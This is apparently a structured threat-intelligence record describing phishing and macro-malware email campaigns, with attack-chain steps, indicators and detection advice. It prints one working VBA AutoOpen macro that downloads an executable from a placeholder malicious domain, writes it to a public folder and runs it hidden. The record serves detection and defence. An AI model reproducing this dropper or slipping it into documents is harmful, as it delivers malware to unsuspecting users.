package_info.package_versions: N/A (applies to email campaigns, not a software package)
package_info.why_malicious: These campaigns deliver malware and phishing via email, exploiting cognitive biases and social engineering to trick users into clicking malicious links or opening attachments. The emails are crafted to bypass user vigilance and technical controls, leading to credential theft, malware infection, and data exfiltration. The use of malicious links and macro-enabled attachments enables attackers to compromise user accounts and endpoints.

execution_context.trigger: runtime (when user opens email and clicks embedded link)

malicious_snippets.code_behavior: At runtime, when the user opens the email and clicks the embedded link, the browser initiates an HTTP request to a malicious external domain, redirecting the user and potentially exposing credentials or downloading malware, resulting in credential theft or device compromise.

malice_analysis.why_suspicious: The email contains an embedded hyperlink pointing to an external, untrusted domain, disguised as a legitimate offer. This is a common phishing tactic used to lure users into visiting malicious sites.
malice_analysis.violated_expectations: Legitimate corporate emails should only contain links to verified, trusted domains and should not pressure users with urgent or exclusive offers to click unknown links.
malice_analysis.similar_legitimate_use: Marketing emails from reputable brands may include promotional links, but these should be to verifiable domains and should not request sensitive information or credentials.
key_indicators: Hyperlink to non-corporate or suspicious domain
Urgency or exclusivity in call-to-action text
Brand impersonation or use of fake offers
Link text mismatching actual destination URL

execution_context.trigger: runtime (when user opens email attachment and enables macros)

malicious_snippets.code_snippet:
Sub AutoOpen()
  Dim objXML As Object
  Set objXML = CreateObject("MSXML2.XMLHTTP")
  objXML.Open "GET", "http://malicious-domain.com/payload.exe", False
  objXML.send
  Set objFSO = CreateObject("Scripting.FileSystemObject")
  Set objFile = objFSO.CreateTextFile("C:\Users\Public\payload.exe", True)
  objFile.Write objXML.responseBody
  objFile.Close
  Shell "C:\Users\Public\payload.exe", vbHide
End Sub
malicious_snippets.code_behavior: At runtime, when the user opens the malicious attachment and enables macros, the VBA code initiates an HTTP GET request to a remote malicious domain, downloads an executable payload, writes it to the public user directory, and executes it, resulting in malware installation on the endpoint.

malice_analysis.why_suspicious: The macro code in the attachment downloads an executable from an external domain and runs it, which is a classic malware delivery technique. This behavior is highly suspicious and rarely, if ever, found in legitimate documents.
malice_analysis.violated_expectations: Legitimate documents should not contain macros that perform network operations, write executables to disk, or launch new processes.
malice_analysis.similar_legitimate_use: Macros may be used for automating tasks in trusted internal documents, but should never be used to download and execute binaries from the internet.
key_indicators: Macro code present in document attachments
Network requests to external, untrusted domains
Creation of executable files in public or temporary directories
Execution of downloaded files via Shell or similar commands

attack_chain.action: User receives a phishing or malware-laden email exploiting cognitive biases such as fake offers, authority, or urgency.
attack_chain.leads_to: User is enticed to interact with a malicious link or open a suspicious attachment.

attack_chain.action: User clicks the malicious link or opens the attachment and enables macros, triggering code execution (redirect to phishing site or macro execution).
attack_chain.leads_to: Credential theft via phishing site or download and execution of malware payload.

attack_chain.action: Malicious payload is delivered: credentials are exfiltrated or malware is installed on the endpoint.
attack_chain.leads_to: Compromise of user account or device, enabling potential lateral movement or data exfiltration.

behavioral_signatures: Emails containing hyperlinks to non-corporate or suspicious domains
Unexpected attachments with macro-enabled document formats (e.g., .docm, .xlsm)
Macros that initiate network requests and write executable files to disk
Emails using urgent, authoritative, or exclusive offer language to prompt user action
Attachments requesting users to enable macros to view content
file_indicators: Attachments with .docm, .xlsm, or other macro-enabled extensions
Files named as invoices, payments, or urgent requests (e.g., invoice.docm, payment.pdf)
Executable files written to C:\Users\Public\ or %TEMP% directories
Presence of AutoOpen or Document_Open macros in attachments
network_indicators: Outbound HTTP/HTTPS requests to domains such as malicious-domain.com or other known phishing/malware domains
Unusual downloads initiated by Office applications (e.g., WINWORD.EXE, EXCEL.EXE)
Connections to domains that are newly registered or flagged as suspicious by threat intelligence feeds
detection_knowledge.how_to_detect: Monitor email gateways for messages containing links to non-corporate domains or macro-enabled attachments, especially those using social engineering themes (urgency, authority, exclusive offers). Analyze attachments in sandbox environments for macro execution, network activity, and file writes. Flag emails with attachments requesting macro enablement or containing suspicious macro code. Correlate user-reported phishing attempts with technical indicators and automate blocking of known malicious domains and file hashes.
